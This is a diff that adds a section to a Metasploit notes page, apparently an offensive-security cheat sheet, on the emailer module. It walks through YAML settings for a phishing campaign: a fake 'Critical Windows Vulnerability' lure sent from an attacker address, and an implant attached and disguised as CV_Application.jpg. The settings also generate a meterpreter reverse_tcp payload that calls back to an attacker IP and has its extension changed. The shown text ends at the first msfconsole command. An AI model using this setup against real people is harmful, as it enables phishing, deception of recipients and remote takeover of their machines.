@@ -1,5 +1,68 @@
 # Metasploit
 
+## YAML Configuration File
+
+Fill in the required configurations by preparing a phishing campaign.
+
+```yaml
+# Emails CSV File (Fname Lname,email)
+to: /path/to/emails.csv
+# Email is sent from this address
+from: attacker@metasf.com
+# Subject
+subject: "[SECURITY-ALERT] Critical Windows Vulnerability"
+# Type ( text or text/html )
+type: text/html
+# Msg body file
+msg_file: /path/to/message_body.txt
+# Number of seconds to wait before next email
+wait: 5
+# Prepend the first name to the email body
+add_name: true
+# Add custom signature from file
+sig: true
+# Signature file
+sig_file: /path/to/sig.txt
+```
+
+Attachment information.
+
+```yaml
+# Add an email attachment (File exploit anyone?) 
+attachment: true
+# Path to file attachment
+attachment_file: /path/to/implant.jpg
+# Name of file attachment
+attachment_file_name: CV_Application.jpg
+# Type of attachment
+attachment_file_type: image/jpeg
+```
+
+Generate implant automatically in metasploit.
+
+```yaml
+# create a metasploit payload
+make_payload: true
+# zip the payload
+zip_payload: true
+# metasploit server ip
+msf_ip: <attacker_IP>
+# metasploit server port
+msf_port: <attacker_PORT>
+# metasploit payload
+msf_payload: windows/x64/meterpreter/reverse_tcp
+# metasploit payload
+msf_filename: implant.exe
+# metasploit location
+msf_location: /usr/share/metasploit-framework
+# change the extension
+msf_change_ext: true
+# new extension
+msf_payload_ext: vxe
+```
+
+## Send Phishing Email
+
 ```
 msf > use auxiliary/client/smtp/emailer
 
